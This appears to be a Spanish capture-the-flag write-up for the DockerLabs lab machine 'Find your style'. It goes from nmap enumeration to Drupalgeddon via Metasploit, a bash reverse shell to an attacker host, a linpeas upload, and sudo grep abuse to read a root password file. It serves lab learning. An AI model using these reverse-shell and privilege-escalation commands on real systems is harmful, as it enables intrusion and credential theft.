# Find your style

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN FindYourStyle`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_1.jpg)     

Solo tenemos el puerto 80 abierto y, por lo que podemos ver, estamos ante un Drupal 8.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_2.jpg)   

Lo que podemos hacer es ver si hay algún exploit que podamos lanzar.  
Abrimos Metasploit y buscamos con el comando `search drupal`.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_3.jpg)     

Usaremos el exploit 1, Drupalgeddon.  
Completaremos las opciones y ejecutaremos el exploit.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_4.jpg)   

Perfecto!  
Hemos obtenido una sessión meterpreter.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_5.jpg)     

Ahora, lo que haremos será enviarnos una reverse shell a nuestra máquina Kali para poder trabajar más cómodamente.  
Para ello, ejecutaremos el comando `shell`, luego escribiremos `/bin/bash` y, por último, después de habernos puesto a la escucha en nuestra máquina Kali, escribiremos:  

`bash -i >& /dev/tcp/172.17.0.8/7070 0>&1`  

Perfecto! 
Ya estamos dentro!  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_6.jpg)       

Ahora intentaremos escalar privilegios.
Ejecutamos los comandos `sudo -l` y `find / -perm -4000 2>/dev/null`, pero no obtenemos nada interesante.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_7.jpg)       

Revisamos también las carpetas clásicas tmp y opt, pero tampoco encontramos nada.    

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_8.jpg)   

Lo que haremos será subir **linpeas** para ver si podemos obtener más información.  
Para ello, montaremos un servidor Python en nuestra máquina Kali con el comando:  

`sudo python3 -m http.server 80`  

Después utilizaremos la herramienta **curl**, ya que wget no está disponible.   

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_9.jpg)    

Ahora daremos permisos de ejecución con el comando `chmod +x linpeas.sh` y lo ejecutaremos.  
Al revisar los resultados, nos llama la atención este punto.   

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_10.jpg)      

Ahora revisaremos el archivo **/etc/passwd** para ver qué usuarios hay en esta máquina.   

Observamos que hay un usuario llamado **ballenita**.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_11.jpg)   

Lo que haremos será intentar iniciar sesión como ballenita con la contraseña que hemos encontrado.    

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_12.jpg)   

¡Perfecto!  
Ahora intentaremos escalar a root.  
Ejecutamos el comando `sudo -l`.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_13.jpg)   

Bien, ahora revisamos la web de GTFOBins y vemos que podemos aprovechar el binario grep.  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_14.jpg)   

Lo que haremos será intentar leer en el directorio home de root para ver si hay algún fichero 'interesante'.  
Ejecutamos el siguiente comando:  

`sudo -u root /bin/ls /root/`  

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_15.jpg)   

¡Bien!  
Ahora intentaremos leer el contenido con el comando grep, ejecutando:  

`sudo grep '' /root/secretitomaximo.txt`

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_16.jpg)     

Ahora probaremos a iniciar sesión como root con esta posible contraseña que hemos descubierto.   

![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_17.jpg)     

¡Y listo!  
¡Ya somos root!  


















